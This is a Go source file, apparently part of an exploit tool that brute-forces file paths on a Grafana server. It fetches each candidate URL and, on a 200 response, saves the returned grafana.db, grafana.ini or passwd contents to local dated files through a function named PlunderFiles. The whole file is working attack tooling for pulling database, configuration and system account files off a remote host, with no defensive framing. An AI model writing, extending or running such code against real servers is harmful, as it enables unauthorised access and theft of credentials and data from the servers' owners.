package bruteforce

import (
	"fmt"
	"io"
	"net/http"
	"os"
	"time"
)

type Bruteforce struct {
	Hostname string
}

func (bruteforce Bruteforce) ReturnDate() string {
	const layout = "2006-01-02"
	current_time := time.Now()
	return current_time.Format(layout)
}

func (bruteforce Bruteforce) PlunderFiles(entry_type string, log_entry string) {
	switch entry_type {
	case "grafana_db":
		filename := fmt.Sprintf("grafana-%s.db", bruteforce.ReturnDate())
		file, err := os.OpenFile(filename, os.O_WRONLY|os.O_CREATE|os.O_EXCL, 0666)
		if err != nil {
			panic(err)
		}

		defer file.Close()

		len, err := file.WriteString(log_entry)
		if err != nil {
			fmt.Printf("ERROR: Attempted to write %d bytes out to %s\n", len, filename)
			panic(err)
		}
	case "grafana_ini":
		filename := fmt.Sprintf("grafana-%s.ini", bruteforce.ReturnDate())
		file, err := os.OpenFile(filename, os.O_WRONLY|os.O_CREATE|os.O_EXCL, 0666)
		if err != nil {
			panic(err)
		}

		defer file.Close()

		len, err := file.WriteString(log_entry)
		if err != nil {
			fmt.Printf("ERROR: Attempted to write %d bytes out to %s\n", len, filename)
			panic(err)
		}
	case "passwd":
		filename := fmt.Sprintf("passwd-%s", bruteforce.ReturnDate())
		file, err := os.OpenFile(filename, os.O_WRONLY|os.O_CREATE|os.O_EXCL, 0666)
		if err != nil {
			panic(err)
		}

		defer file.Close()

		len, err := file.WriteString(log_entry)
		if err != nil {
			fmt.Printf("ERROR: Attempted to write %d bytes out to %s\n", len, filename)
			panic(err)
		}
	}
}

func (bruteforce Bruteforce) BruteforceFile(entry string, entry_type string) {
	target_name := fmt.Sprintf("%s%s", bruteforce.Hostname, entry)
	target, err := http.Get(target_name)
	if err != nil {
		panic(err)
	}

	defer target.Body.Close()

	switch target.StatusCode {
	case 403:
		break
	case 404:
		break
	case 200:
		fmt.Printf("Match found: %s\n", target_name)
		body, err := io.ReadAll(target.Body)
		if err != nil {
			panic(err)
		}

		log_entry := fmt.Sprintf("%s\n", body)
		bruteforce.PlunderFiles(entry_type, log_entry)
	}
}
